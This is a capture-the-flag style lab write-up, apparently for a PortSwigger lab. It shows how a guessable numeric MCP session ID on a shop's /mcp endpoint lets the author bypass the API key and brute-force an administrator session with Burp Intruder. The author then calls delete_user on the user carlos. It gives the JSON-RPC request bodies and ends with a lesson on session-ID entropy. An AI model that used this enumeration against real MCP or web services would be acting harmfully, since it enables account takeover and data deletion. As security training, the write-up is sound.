## Lab overview

This lab is a shop with an MCP endpoint at `/mcp`. The account page shows an API key, and the server provides an MCP session ID that is vulnerable to IDOR.

We start by visiting the site and logging in with `wiener:peter`. There's no part of the front end that has an MCP button or anything similar, so open Burp Suite, intercept a request and send it to Repeater. Change the path to `/mcp`, the method to `POST`, and add the header `Content-Type: application/json`.

Create a new request header `Authorization: Bearer apikey`. On logging in to your account `wiener:peter`, you get your API key on the account page (`m561…wi5F`).

<Callout type="tip" title="Hint">
  Look closely at the session ID you're issued, and find out which requests still need your API key once you have one.
</Callout>

## The session ID is the credential

Since the MCP session ID is a number, let's get our account details and see what happens when we change it. For my session:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "get_account_details"
  }
}
```

<div className="max-w-[720px] mx-auto">

![get_account_details with our own session ID](/images/writeups/portswigger/mcp-session-own-account.png)

</div>

I noticed that after removing the `Authorization` header containing my API key, but with my MCP session ID still present, the request is still successful. Let me try the `delete_user` tool:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "delete_user"
  }
}
```

It returns:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "You are not authorized to use this tool"
      }
    ],
    "isError": true
  }
}
```

This happens both when I removed the `Authorization` header and when it's present. All three ordinary methods work without the `Authorization` header, so the MCP session ID is what's used for authorization.

## Enumerating session IDs

I sent the request to Burp Intruder to enumerate the last two digits of the MCP session ID from 1 to 100:

<div className="max-w-[720px] mx-auto">

![Intruder configured to iterate the last two digits of the session ID](/images/writeups/portswigger/mcp-session-intruder-setup.png)

</div>

On doing that I get several 200 OK responses. One stood out because of its response, and that was 78, the full ID being `Mcp-Session-Id: 703378`:

<div className="max-w-[720px] mx-auto">

![Intruder results with payload 78 standing out](/images/writeups/portswigger/mcp-session-intruder-results.png)

</div>

This tells me this is an admin account, so let me test `get_account_details` on it:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "get_account_details"
  }
}
```

<div className="max-w-[720px] mx-auto">

![get_account_details with the administrator's session ID](/images/writeups/portswigger/mcp-session-admin-account.png)

</div>

Perfect. I proceed to delete Carlos with the administrator's session ID:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "delete_user",
    "arguments": {
      "username": "carlos"
    }
  }
}
```

<div className="max-w-[720px] mx-auto">

![delete_user succeeds with the administrator's session ID](/images/writeups/portswigger/mcp-session-deleted.png)

</div>

It was successfully deleted, and now we've solved the lab.

## Key takeaway

The API key was optional for every ordinary tool call. Once the `initialize` response handed us a session ID, that value alone was enough to act as the user. Because the ID was only a short number, enumerating the last two digits found the administrator's session in a hundred requests. A session identifier needs the same entropy and verification as the credential it replaces, otherwise it becomes a weaker back door into the same account.
